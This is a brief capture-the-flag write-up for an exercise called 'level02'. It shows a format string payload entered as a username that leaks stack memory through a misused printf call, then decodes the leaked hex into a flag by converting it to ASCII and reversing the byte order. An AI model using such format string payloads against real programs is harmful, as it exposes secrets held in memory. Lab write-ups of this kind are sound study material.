## Help level02

In this exercise there is a decoy, the system /bin/sh who will not be use here
But we will exploit the printf who is in the wrong format "printf(&var);"

```
./level02
username : %22$08lx %23$08lx %24$08lx %25$08lx %26$08lx
password : (not usefull)
```
with this command we got :
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d  does not have access!

it's look the good way, but it's not the flag so we need to change it, start by putting it in ASCII:
unPR47hH EAJ5as9Q 7zqCWNgX 5J5hnGXs H3gPfK9M

This look like a flag ! But it's still not working, then remember we are in little endian, so we need to reverse it

Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H
Now we have the flag !
